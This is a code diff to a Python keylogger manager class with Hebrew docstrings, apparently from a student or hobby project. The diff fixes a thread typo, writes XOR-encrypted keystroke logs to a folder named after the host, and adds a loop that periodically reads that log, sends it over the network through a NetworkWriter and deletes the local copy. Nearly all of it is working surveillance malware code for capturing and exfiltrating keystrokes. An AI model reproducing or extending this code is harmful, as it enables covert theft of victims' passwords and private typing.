@@ -1,5 +1,6 @@
 import time
 import socket
+import os
 from datetime import datetime
 import KeyLoggerService as ks
 import file_writer as fw
@@ -11,14 +12,17 @@ import NetworkWriter as nw
 
 class KeyLoggerManager:
 
-    def __init__(self, interval=10):
+    def __init__(self, interval=10, writer="file"):
         self.keylogger_service = ks.KeyLoggerService()
         self.file_writer = fw.FileWriter()
         self.network_writer = nw.NetworkWriter()
         self.interval = interval
         self.buffer = []
         self.running = False
-        self.tread = threading.Thread(target=self.run)
+        self.thread = threading.Thread(target=self.run)
+        self.machine_name = socket.gethostname()
+        self.machine_folder = os.path.join("data", self.machine_name)
+        self.log_file = os.path.join(self.machine_folder, "log.txt")
 
     def collect_keystrokes(self):
         """אוספת הקשות מה-KeyLoggerService ומאגדת ל-Buffer"""
@@ -31,33 +35,40 @@ class KeyLoggerManager:
         if self.buffer:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             data = "".join(self.buffer)
-
-            processed_data = f"[{timestamp}] {data}\n"
-
+            processed_data = (f"{timestamp}, {data}\n")
             encrypted_data = enc.Encryptor.xor_encryption_and_decryption(processed_data)
-
-            machine_name = socket.gethostname()
-            # self.file_writer.send_data(encrypted_data,machine_name)
-            self.network_writer.send_data(encrypted_data, machine_name)
+            self.file_writer.send_data(encrypted_data,self.machine_name)
+            # self.network_writer.send_data(encrypted_data, machine_name)
             self.buffer.clear()
 
     def run(self):
         """ פונקציה המפעילה את ה-KeyLoggerService ומפעילה את האיסוף והשמירה של הנתונים"""
         self.running = True
         self.keylogger_service.start_logging()
+        check_last_send = 36
         while self.running:
             time.sleep(self.interval)
             self.collect_keystrokes()
             self.process_and_store_data()
+            check_last_send -= 1
+            if not check_last_send:
+                data = ""
+                if os.path.isfile(self.log_file):
+                    with open(self.log_file, "r", encoding="utf-8") as f:
+                        data += f.read()
+                    self.network_writer.send_data(data, self.machine_name)
+                    os.remove(self.log_file)
+                check_last_send = 36
+
 
     def start(self):
         """ מפעילה את KeyLoggerManager בלולאה"""
-        self.tread.start()
+        self.thread.start()
 
     def stop(self):
         """ מפסיקה את האיסוף והרישום, ומבצעת שמירה אחרונה של הנתונים"""
         self.running = False
-        self.tread.join()
+        self.thread.join()
         self.keylogger_service.stop_logging()
         self.process_and_store_data()
 
